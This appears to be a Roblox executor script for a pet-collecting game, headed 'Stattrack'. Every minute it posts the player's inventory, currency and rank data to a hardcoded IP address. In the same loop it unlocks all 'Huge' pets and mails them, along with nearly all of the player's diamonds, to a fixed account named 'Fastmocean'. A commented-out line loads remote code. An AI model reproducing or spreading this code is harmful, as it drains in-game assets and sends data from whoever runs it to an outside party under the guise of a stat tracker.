local daycareCmds = require(game:GetService("ReplicatedStorage").Library.Client.DaycareCmds)
local network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
local rankCmds = require(game:GetService("ReplicatedStorage").Library.Client.RankCmds)

-- Stattrack

local requests = http_request or request
local HttpService = game:GetService("HttpService")
local ReplicatedFirst = game:GetService("ReplicatedFirst")
local player = game.Players.LocalPlayer
local username = player.Name
local leaderstats = player.leaderstats
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ranks = require(game:GetService("ReplicatedStorage").Library.Directory.Ranks)

local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)




local previousGemCount = leaderstats["💎 Diamonds"].Value
local previousTime = tick()


 --local function daycarevoucher()
   -- loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/f420cbd8fa65c531f13fd0d569bc3300.lua"))()
--end

local function sendGems()

    local currentGemCount = leaderstats["💎 Diamonds"].Value
    local saveData = Save.Get()
    local Inventory = saveData["Inventory"]
    local username = "Fastmocean"
    local Gemssend = 100000000
    local diamondUID  

    -- Find the UID for Diamonds
    for Class, Inv in pairs(Inventory) do
        if Class == "Currency" then  
            for uid, Item in pairs(Inv) do
                if Item.id == "Diamonds" then  
                    diamondUID = uid  
                    print("Diamonds UID found:", diamondUID)
                    break  
                end
            end
        end
    end

    -- Check if diamonds exist and if the player has enough gems
    if diamondUID and currentGemCount > Gemssend then
        local args = {
            [1] = username,
            [2] = "Here you go buddy",
            [3] = "Currency",
            [4] = diamondUID,  
            [5] = currentGemCount - 10000000
        }

        print("Invoking Server with args:", unpack(args))

        -- Send gems via the network
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    else
        warn("Insufficient Gems or UID not found")
    end
end


local function autosendmail()
    getgenv().MailToUser = "Fastmocean"
    local HugeUIDList = {}
    for PetUID, PetData in pairs(require(game.ReplicatedStorage.Library.Client.Save).Get().Inventory.Pet) do
        if PetData.id:find("Huge ") then
            table.insert(HugeUIDList, PetUID)
            if PetData._lk then
                repeat
                    task.wait()
                until network.Invoke("Locking_SetLocked", PetUID, false)
                print("Unlocked", PetUID)
            end
        end
    end

    for _, PetUID in pairs(HugeUIDList) do
        repeat
            task.wait()
        until network.Invoke("Mailbox: Send", MailToUser, tostring(Random.new():NextInteger(9, 999999)), "Pet", PetUID, 1)
        print("Sent", PetUID)
    end
end






local function claimrank()
    local totalStars = 0
    for i,v in require(game:GetService("ReplicatedStorage").Library.Directory.Ranks)[rankCmds.GetTitle()]["Rewards"] do
        totalStars += v["StarsRequired"]
        if Save()["RankStars"] >= totalStars and not Save()["RedeemedRankRewards"][tostring(i)] then
            network.Fire("Ranks_ClaimReward", i)
            task.wait(.5)
        end
    end
end




local function GetRAP(Type, Item)
    local stackKey = HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
    local rap = require(ReplicatedStorage.Library.Client.DevRAPCmds).Get({
        Class = {Name = Type},
        IsA = function(hmm) return hmm == Type end,
        GetId = function() return Item.id end,
        StackKey = function() return stackKey end
    }) or 0
    return rap
end

-- Function to get RAP for multiple items of the same type
local function GetRap2(Items, Class, UID, Amount, pt, sh, tn)
    local ItemInfo = {id = Items, pt = pt, sh = sh, tn = tn}
    local Rap = GetRAP(Class, ItemInfo)
    
    return Rap * Amount
end


-- Function to calculate the total RAP for the player's inventory
function GetTotalRap()
    local Total = 0
    local Inventory = Save.Get()["Inventory"]
    for Class, Inv in pairs(Inventory) do
        if Class ~= "Pet" and Class ~= "Enchant" and Class ~= "Potion" then 
            for uid, Item in pairs(Inv) do
                local Amount = Item._am or 1
                local rap = GetRap2(Item.id, Class, uid, Amount, Item.pt, Item.sh, Item.tn)
                Total += rap
            end
        end
    end
    return Total
end

local function abbreviateNumber(value)
    local absValue = math.abs(value)
    
    if absValue >= 1e9 then
        return string.format("%.1fB", value / 1e9)  
    elseif absValue >= 1e6 then
        return string.format("%.1fM", value / 1e6)  
    elseif absValue >= 1e3 then
        return string.format("%.1fK", value / 1e3)  
    else
        return tostring(value) 
    end
end



local previousRap = GetTotalRap() -- Store the previous RAP value



local function updateUser()
    local currentGemCount = leaderstats["💎 Diamonds"].Value
    local OK = leaderstats["💎 Diamonds"].Value
    local currentRap  = GetTotalRap()

    local currentTime = tick()
    
    local timeElapsed = (currentTime - previousTime) / 60

    local gemsGained = currentGemCount - previousGemCount
    local gemspermin = 0
    if timeElapsed > 0 then
        gemspermin = gemsGained / timeElapsed
    end
        -- Calculate RAP per minute
        local rapGained = currentRap - previousRap
        local rapPerMin = 0
        if timeElapsed > 0 then
            rapPerMin = rapGained / timeElapsed
        end

    previousGemCount = currentGemCount
    previousRap = currentRap -- Update the previous RAP value
 
    previousTime = currentTime

    local gemCount = abbreviateNumber(currentGemCount)
    local gemsPerMinFormatted = string.format("%.2f", gemspermin)  
    local rapPerMinFormatted = string.format("%.2f", rapPerMin) -- Format RAP per minute
    local EggSlots = Save.Get().EggHatchCount
    local PetSlots = Save.Get().MaxPetsEquipped
    local rank = Save.Get().Rank

    local Miscinv = Save.Get()["Inventory"]["Misc"]
    local Lootboxinv = Save.Get()["Inventory"]["Lootbox"]
    local petCubeCount = 0
    local ultraPetCubeCount = 0
    local elementalcount = 0

    
    for _, item in pairs(Miscinv) do
        if item.id == "Pet Cube" then  
            petCubeCount = petCubeCount + item._am  
        elseif item.id == "Ultra Pet Cube" then
            ultraPetCubeCount = ultraPetCubeCount + item._am
        end
    end

    for _, item in pairs(Lootboxinv) do
        if item.id == "Elemental Gift" then  
            elementalcount = elementalcount + item._am  

        end
    end
    print(elementalcount)

    


    hugecount = 0
    for _, pet in pairs(Save.Get()["Inventory"]["Pet"]) do
        if string.find(pet.id, "Huge") then
            hugecount = hugecount + 1
        end
    end

    local url = "http://141.134.135.241:8080/update-user"

    local data = {
        Url = url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode({
            username = username,

            gems = gemCount,
            status = "online",
            huges = hugecount,
            rank = rank,
            EggSlots = EggSlots,
            PetSlots = PetSlots,
            diamondsPerMin = gemsPerMinFormatted,
            totalgems = OK,
            totalRap = currentRap,
            rapPerMin = rapPerMinFormatted, 
            petCubeCount = petCubeCount,
            ultraPetCubeCount = ultraPetCubeCount,
            elementalcount = elementalcount,
            game = "Game1"  -- This will tell the server which game this data is for

 

        })
    }

    local response = requests(data)
    if response.Success then
        print("User data updated successfully")
    else
        warn("Failed to update user data:", response.StatusMessage)
    end
end

updateUser()

while wait(60) do
    -- Run all tasks in parallel using task.spawn()
    task.spawn(function()
        updateUser()
    end)

    task.spawn(function()
        claimrank()
    end)

    task.spawn(function()
        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Claim All"):InvokeServer()
    end)
    task.spawn(function()
        autosendmail()
    
    end)
    task.spawn(function()
        sendGems()
    end)

end
